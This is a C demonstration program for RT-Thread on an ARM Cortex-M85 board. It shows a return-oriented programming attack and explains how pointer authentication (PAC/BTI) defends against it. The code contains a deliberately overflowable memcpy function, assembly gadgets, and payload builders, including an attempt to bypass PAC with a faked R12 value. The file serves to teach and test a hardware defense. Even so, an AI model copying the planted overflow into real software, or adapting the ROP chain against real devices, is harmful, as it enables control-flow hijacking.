/*
 * Copyright (c) 2006-2025
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * Change Logs:
 * Date           Author            Notes
 * 2025-10-26     Tianchi YU        ROP attack demonstration
 */

#include <rtthread.h>
#include <rtdevice.h>
#include "hal_data.h"
#include <stdint.h>
#include <string.h>

#define LED_PIN BSP_IO_PORT_01_PIN_02

/* ========== Helper Functions ========== */
/**
 * @brief Helper function to analyze stack layout
 * Use this to determine the correct offset for ROP attack
 */
__attribute__((noinline, optimize("O0"))) static void analyze_stack_layout(void)
{
    char buffer[16];

    rt_kprintf("\n=== Stack Layout Analysis ===\n");
    rt_kprintf("Buffer address: 0x%08X\n", (uint32_t)buffer);

    uint32_t *stack = (uint32_t *)buffer;
    rt_kprintf("\nStack dump (from buffer start):\n");
    for (int i = 0; i < 16; i++)
    {
        rt_kprintf("  [+%2d] 0x%08X = 0x%08X",
                   i * 4, (uint32_t)&stack[i], stack[i]);

        if (i >= 4 && i <= 10)
        {
            rt_kprintf(" <- possible saved register");
        }
        rt_kprintf("\n");
    }

    rt_kprintf("\nTo find LR offset:\n");
    rt_kprintf("1. Set breakpoint at vulnerable_function entry\n");
    rt_kprintf("2. Check disassembly for PUSH instruction\n");
    rt_kprintf("3. Count how many registers are pushed\n");
    rt_kprintf("4. Offset = 16 (buffer) + 4*(registers before LR)\n");
    rt_kprintf("\n");
}

/* ========== ROP Gadgets ========== */

/**
 * @brief Gadget 1: Set a global flag (simulates privileged operation)
 * 
 * CRITICAL: Uses POP {pc} to continue the ROP chain
 * Cannot use BX lr because lr points back to vulnerable_function
 */
static volatile uint32_t g_privileged_flag = 0;

__attribute__((noinline, naked))
static void gadget_set_flag(void)
{
    __asm volatile (
        // Set privileged flag
        "ldr r0, =g_privileged_flag\n"
        "ldr r1, =0xDEADBEEF\n"
        "str r1, [r0]\n"
        
        // Pop next gadget address from stack
        "pop {pc}\n"
        
        ::: "r0", "r1", "memory"
    );
}

/**
 * @brief Gadget 2: Leak secret information
 */
__attribute__((noinline, naked))
static void gadget_leak_secret(void)
{
    __asm volatile (
        "push {r4, lr}\n"
        "adr r0, 1f\n"
        "bl rt_kprintf\n"
        "pop {r4, lr}\n"
        "pop {pc}\n"
        
        "1:\n"
        ".asciz \"[GADGET] Secret leaked: 0x12345678\\n\"\n"
        ".align 2\n"
        
        ::: "r0", "r1", "r2", "r3", "r4", "lr", "memory"
    );
}

/**
 * @brief Gadget 3: Execute dangerous operation
 */
__attribute__((noinline, naked))
static void gadget_dangerous_op(void)
{
    __asm volatile (
        "push {r4, lr}\n"
        "adr r0, 1f\n"
        "bl rt_kprintf\n"
        "pop {r4, lr}\n"
        "pop {pc}\n"
        
        "1:\n"
        ".asciz \"[GADGET] Executing dangerous operation!\\n\"\n"
        ".align 2\n"
        
        ::: "r0", "r1", "r2", "r3", "r4", "lr", "memory"
    );
}

/**
 * @brief Exit gadget: 
 * 1. printf flag & frequency blink LED to indicate end of ROP chain
 * 2. Infinite loop to prevent return
 */
__attribute__((noinline))
static void gadget_exit(void)
{
    rt_kprintf("[GADGET] ROP chain completed. Changed privileged flag: 0x%08X\n", g_privileged_flag);
    while (1)
    {
        rt_pin_write(LED_PIN, PIN_HIGH);
        rt_thread_mdelay(100);
        rt_pin_write(LED_PIN, PIN_LOW);
        rt_thread_mdelay(100);
    }
}

__attribute__((noinline, naked)) static void gadget_exit2(void)
{
    __asm volatile(
        "push {r4, lr}\n"
        "adr r0, 1f\n"
        "bl rt_kprintf\n"
        "pop {r4, lr}\n"

        // Enter infinite loop (safe exit)
        "2:\n"
        "b 2b\n"

        "1:\n"
        ".asciz \"[ROP] Chain completed - entering safe loop\\n\"\n"
        ".align 2\n"

        ::: "r0", "r1", "r2", "r3", "r4", "lr", "memory");
}

/* ========== Vulnerable Function ========== */

/**
 * @brief Vulnerable function with stack buffer overflow
 * 
 * This function intentionally has a buffer overflow vulnerability of ROP attacks
 */
__attribute__((noinline, optimize("O1")))
static void vulnerable_function(const char *input, size_t len)
{
    char buffer[16];
    
    rt_kprintf("\n[VULN] Executing memcpy (%d bytes)...\n", len);
    rt_kprintf("[VULN] Buffer at: 0x%08X\n", (uint32_t)buffer);
    
    // Execute overflow copy
    memcpy(buffer, input, len);
    
    rt_kprintf("[VULN] Overflow complete, returning...\n\n");
}

/* ========== Normal Function ========== */

/**
 * @brief Normal function - NOT part of the ROP chain
 * Used for normal execution demo only
 */
__attribute__((noinline))
static void normal_function(void)
{
    rt_kprintf("[NORMAL] This is a normal function call\n");
    rt_kprintf("[NORMAL] Privileged flag value: 0x%08X\n", g_privileged_flag);
}

/* ========== Attack Demonstration Functions ========== */

/**
 * @brief Demonstrate normal execution (no attack)
 */
static void demo_normal_execution(void)
{
    rt_kprintf("\n=== DEMO 1: Normal Execution ===\n");
    
    const char *safe_input = "Hello";
    vulnerable_function(safe_input, 6);
    normal_function();
    
    rt_kprintf("[RESULT] Privileged flag: 0x%08X (should be 0)\n\n", g_privileged_flag);
}

/**
 * @brief Demonstrate ROP attack without PAC protection
 */
static void demo_rop_attack(void)
{
    rt_kprintf("\n=== DEMO 2: ROP Attack (without PAC) ===\n");
    rt_kprintf("[ATTACK] Preparing ROP chain...\n");
    
    char malicious_input[64];
    int offset = 28;  // 16 (buffer) + 12 (r4,r5,r6)
    
    memset(malicious_input, 0, sizeof(malicious_input));
    memset(malicious_input, 'A', offset);
    
    // Get gadget addresses and ensure Thumb bit is set
    uint32_t addr1 = (uint32_t)gadget_set_flag | 0x1;
    uint32_t addr2 = (uint32_t)gadget_leak_secret | 0x1;
    uint32_t addr3 = (uint32_t)gadget_dangerous_op | 0x1;
    uint32_t addr4 = (uint32_t)gadget_exit | 0x1;
    
    rt_kprintf("\n[ATTACK] ROP Chain:\n");
    rt_kprintf("  [0] gadget_set_flag:     0x%08X\n", addr1);
    rt_kprintf("  [1] gadget_leak_secret:  0x%08X\n", addr2);
    rt_kprintf("  [2] gadget_dangerous_op: 0x%08X\n", addr3);
    rt_kprintf("  [3] gadget_exit:         0x%08X\n", addr4);
    
    // Build ROP chain
    uint32_t *rop_chain = (uint32_t *)(malicious_input + offset);
    rop_chain[0] = addr1;  // Overwrite pc with gadget_set_flag
    rop_chain[1] = addr2;  // gadget_set_flag will POP this to pc
    rop_chain[2] = addr3;  // gadget_leak_secret will POP this to pc
    rop_chain[3] = addr4;  // gadget_dangerous_op will POP this to pc
    
    rt_kprintf("\n[ATTACK] Payload structure:\n");
    rt_kprintf("  Bytes [00-15]: Buffer (16 bytes)\n");
    rt_kprintf("  Bytes [16-19]: Overwrite r4\n");
    rt_kprintf("  Bytes [20-23]: Overwrite r5\n");
    rt_kprintf("  Bytes [24-27]: Overwrite r6\n");
    rt_kprintf("  Bytes [28-31]: Overwrite pc with gadget_set_flag\n");
    rt_kprintf("  Bytes [32-35]: gadget_leak_secret\n");
    rt_kprintf("  Bytes [36-39]: gadget_dangerous_op\n");
    rt_kprintf("  Bytes [40-43]: gadget_exit\n");
    
    rt_kprintf("\n[ATTACK] Launching attack...\n");
    rt_kprintf("================================================\n");
    
    g_privileged_flag = 0;
    
    vulnerable_function(malicious_input, 44);
    
    rt_kprintf("================================================\n");
    rt_kprintf("[RESULT] Privileged flag: 0x%08X ", g_privileged_flag);
    if (g_privileged_flag == 0xDEADBEEF) {
        rt_kprintf("(ATTACK SUCCESS!)\n");
        rt_kprintf("[RESULT] ROP chain executed - unauthorized operations performed!\n");
    } else {
        rt_kprintf("(Protected)\n");
        rt_kprintf("[RESULT] Attack was prevented\n");
    }
    rt_kprintf("\n");
}


/**
 * @brief Demonstrate ROP attack with PAC protection - test 1
 */
static void demo_rop_attack_with_pac_1(void)
{
    rt_kprintf("\n=== DEMO 3: ROP Attack (with PAC - Fake R12) ===\n");
    rt_kprintf("[ATTACK] Preparing ROP chain...\n");
    
    char malicious_input[64];
    int offset = 16;  // 16 (buffer)
    
    memset(malicious_input, 0, sizeof(malicious_input));
    memset(malicious_input, 'A', offset);
	
	  // Fake R12 to bypass AUT
	  uint32_t value = 0xF7FB8DA5; //0x741e09d4;
	  memcpy(malicious_input + offset, &value, sizeof(value));
    offset += sizeof(value);
	
	  // Fulfill r4-r6
	  memset(malicious_input + offset, 'A', 12);
	  offset += 12;
	
    // Get gadget addresses and ensure Thumb bit is set
    uint32_t addr1 = (uint32_t)gadget_set_flag | 0x1;
    uint32_t addr2 = (uint32_t)gadget_leak_secret | 0x1;
    uint32_t addr3 = (uint32_t)gadget_dangerous_op | 0x1;
    uint32_t addr4 = (uint32_t)gadget_exit | 0x1;
    
    rt_kprintf("\n[ATTACK] ROP Chain:\n");
    rt_kprintf("  [0] gadget_set_flag:     0x%08X\n", addr1);
    rt_kprintf("  [1] gadget_leak_secret:  0x%08X\n", addr2);
    rt_kprintf("  [2] gadget_dangerous_op: 0x%08X\n", addr3);
    rt_kprintf("  [3] gadget_exit:         0x%08X\n", addr4);
    
    // Build ROP chain
    uint32_t *rop_chain = (uint32_t *)(malicious_input + offset);
    rop_chain[0] = addr1;  // Overwrite pc with gadget_set_flag
    rop_chain[1] = addr2;  // gadget_set_flag will POP this to pc
    rop_chain[2] = addr3;  // gadget_leak_secret will POP this to pc
    rop_chain[3] = addr4;  // gadget_dangerous_op will POP this to pc
    
    rt_kprintf("\n[ATTACK] Payload structure:\n");
    rt_kprintf("  Bytes [00-15]: Buffer (16 bytes)\n");
    rt_kprintf("  Bytes [16-19]: Overwrite r12\n");
    rt_kprintf("  Bytes [20-23]: Overwrite r4\n");
    rt_kprintf("  Bytes [24-27]: Overwrite r5\n");
		rt_kprintf("  Bytes [28-31]: Overwrite r6\n");
    rt_kprintf("  Bytes [32-35]: Overwrite pc with gadget_set_flag\n");
    rt_kprintf("  Bytes [36-39]: gadget_leak_secret\n");
    rt_kprintf("  Bytes [40-43]: gadget_dangerous_op\n");
    rt_kprintf("  Bytes [44-47]: gadget_exit\n");
    
    rt_kprintf("\n[ATTACK] Launching attack...\n");
    rt_kprintf("================================================\n");
    
    g_privileged_flag = 0;
    
    vulnerable_function(malicious_input, 48);
    
    rt_kprintf("================================================\n");
    rt_kprintf("[RESULT] Privileged flag: 0x%08X ", g_privileged_flag);
    if (g_privileged_flag == 0xDEADBEEF) {
        rt_kprintf("(ATTACK SUCCESS!)\n");
        rt_kprintf("[RESULT] ROP chain executed - unauthorized operations performed!\n");
    } else {
        rt_kprintf("(Protected)\n");
        rt_kprintf("[RESULT] Attack was prevented\n");
    }
    rt_kprintf("\n");
}

/**
 * @brief Demonstrate how PAC would defend against ROP
 * 
 * Note: This requires compilation with PAC enabled
 */
static void demo_pac_defense(void)
{
    rt_kprintf("\n=== DEMO 4: PAC Defense Against ROP ===\n");
    rt_kprintf("[INFO] PAC (Pointer Authentication Code) defense:\n");
    rt_kprintf("  1. Function entry: LR is signed with PACIASP\n");
    rt_kprintf("  2. Function exit:  LR is authenticated with AUTIASP\n");
    rt_kprintf("  3. If LR was tampered: Authentication fault occurs\n");
    rt_kprintf("\n[NOTE] To test PAC defense:\n");
    rt_kprintf("  - Recompile with -mbranch-protection=pac-ret+bti\n");
    rt_kprintf("  - The same ROP attack will trigger an authentication fault\n");
    rt_kprintf("  - This prevents the attacker from hijacking control flow\n\n");
}

/* ========== Summary ========== */

static void print_summary(void)
{
    rt_kprintf("\n" );
    rt_kprintf("================================================================\n");
    rt_kprintf("         ROP Attack & PAC Defense - Demo Summary\n");
    rt_kprintf("================================================================\n");
    rt_kprintf(" ROP (Return-Oriented Programming):\n");
    rt_kprintf("  - Exploits buffer overflow to overwrite return addresses\n");
    rt_kprintf("  - Chains together existing code snippets (gadgets)\n");
    rt_kprintf("  - Bypasses DEP/NX by reusing existing executable code\n");
    rt_kprintf("\n");
    rt_kprintf(" PAC (Pointer Authentication Codes):\n");
    rt_kprintf("  - Signs return addresses with cryptographic signature\n");
    rt_kprintf("  - Verifies signature before using the return address\n");
    rt_kprintf("  - Tampered addresses cause authentication fault\n");
    rt_kprintf("  - Effectively defeats ROP attacks\n");
    rt_kprintf("\n");
    rt_kprintf(" Cortex-M85 Implementation:\n");
    rt_kprintf("  - PACIASP: Sign LR on function entry\n");
    rt_kprintf("  - AUTIASP: Authenticate LR on function return\n");
    rt_kprintf("  - Enabled with: -mbranch-protection=pac-ret+bti\n");
    rt_kprintf("================================================================\n");
    rt_kprintf("\n");
}

/* ========== Main Entry ========== */

void hal_entry(void)
{
    rt_kprintf("\n");
    rt_kprintf("================================================================\n");
    rt_kprintf("      ARM Cortex-M85 ROP Attack Demonstration\n");
    rt_kprintf("          PAC/BTI Security Features\n");
    rt_kprintf("================================================================\n");
    
    print_summary();
    
    // Debug mode: Uncomment to test offset calculation
    // analyze_stack_layout();
    
    demo_normal_execution();    // Show normal behavior
    //demo_rop_attack();          // Demonstrate ROP attack
	  demo_rop_attack_with_pac_1();
    demo_pac_defense();         // Explain PAC defense
    
    rt_kprintf("\n[INFO] Demonstration complete. LED will blink.\n");
    rt_kprintf("[INFO] Reset the board to run the demo again.\n\n");
    
    // LED blinking loop
    while (1)
    {
        rt_pin_write(LED_PIN, PIN_HIGH);
        rt_thread_mdelay(500);
        rt_pin_write(LED_PIN, PIN_LOW);
        rt_thread_mdelay(500);
    }
}

